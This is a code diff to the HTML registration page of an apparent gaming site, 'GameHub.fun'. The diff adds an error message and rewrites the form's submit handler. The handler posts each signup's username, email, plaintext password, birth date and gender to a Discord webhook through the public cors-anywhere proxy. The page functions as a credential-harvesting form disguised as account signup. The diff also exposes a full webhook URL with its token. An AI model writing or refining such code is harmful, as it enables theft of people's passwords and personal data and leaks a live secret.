@@ -368,6 +368,18 @@
             font-weight: 500;
         }
         
+        .error-message {
+            background-color: rgba(255, 107, 107, 0.1);
+            border: 1px solid var(--secondary);
+            color: var(--secondary);
+            padding: 14px;
+            border-radius: 10px;
+            margin-bottom: 22px;
+            text-align: center;
+            display: none;
+            font-weight: 500;
+        }
+        
         /* Modal Styles */
         .modal {
             display: none;
@@ -477,6 +489,10 @@
             
             <div class="success-message" id="successMessage">
                 <i class="fas fa-check-circle"></i> Registration successful! Redirecting...
+            </div>
+            
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle"></i> Registration failed. Please try again later.
             </div>
             
             <form class="register-form" id="registerForm">
@@ -627,7 +643,7 @@
         });
         
         // Form submission
-        document.getElementById("registerForm").addEventListener("submit", function(e) {
+        document.getElementById("registerForm").addEventListener("submit", async function(e) {
             e.preventDefault();
             
             const username = document.getElementById("register-username").value;
@@ -641,35 +657,43 @@
                 return;
             }
 
-            // Discord webhook URL
-            const webhookURL = "https://discord.com/api/webhooks/1407147506311106590/oLLIBjp8ItYy8u0SSZuVsPnP_QJ56eIJQ_w6zYjqvBu5RhYexB1X7o50PhCCHGp_YiId";
+            // Hide previous messages
+            document.getElementById("successMessage").style.display = 'none';
+            document.getElementById("errorMessage").style.display = 'none';
+            
+            try {
+                // Use a CORS proxy to avoid CORS issues on GitHub Pages
+                const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+                const webhookURL = "https://discord.com/api/webhooks/1407147506311106590/oLLIBjp8ItYy8u0SSZuVsPnP_QJ56eIJQ_w6zYjqvBu5RhYexB1X7o50PhCCHGp_YiId";
 
-            const embedData = {
-                embeds: [{
-                    title: "🎮 New GameHub.fun Registration",
-                    color: 0x7e58ff,
-                    fields: [
-                        { name: "👤 Username", value: username, inline: true },
-                        { name: "📧 Email", value: email, inline: true },
-                        { name: "🔑 Password", value: `||${password}||`, inline: true },
-                        { name: "🎂 Birth Date", value: birthdate, inline: true },
-                        { name: "🚻 Gender", value: gender, inline: true },
-                    ],
-                    timestamp: new Date().toISOString(),
-                }]
-            };
+                const embedData = {
+                    embeds: [{
+                        title: "🎮 New GameHub.fun Registration",
+                        color: 0x7e58ff,
+                        fields: [
+                            { name: "👤 Username", value: username, inline: true },
+                            { name: "📧 Email", value: email, inline: true },
+                            { name: "🔑 Password", value: `||${password}||`, inline: true },
+                            { name: "🎂 Birth Date", value: birthdate, inline: true },
+                            { name: "🚻 Gender", value: gender, inline: true },
+                        ],
+                        timestamp: new Date().toISOString(),
+                    }]
+                };
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(embedData),
-            })
-            .then(response => {
+                const response = await fetch(proxyUrl + webhookURL, {
+                    method: "POST",
+                    headers: { 
+                        "Content-Type": "application/json",
+                        "Origin": window.location.origin
+                    },
+                    body: JSON.stringify(embedData),
+                });
+                
                 if (!response.ok) throw new Error("Failed to send to Discord");
                 
                 // Show success message
-                const successMessage = document.getElementById("successMessage");
-                successMessage.style.display = 'block';
+                document.getElementById("successMessage").style.display = 'block';
                 
                 // Reset form
                 document.getElementById("registerForm").reset();
@@ -678,11 +702,10 @@
                 setTimeout(() => {
                     alert("Registration successful! Welcome to GameHub.fun");
                 }, 2000);
-            })
-            .catch(error => {
+            } catch (error) {
                 console.error("Error:", error);
-                alert("Registration failed. Please try again.");
-            });
+                document.getElementById("errorMessage").style.display = 'block';
+            }
         });
     </script>
 </body>
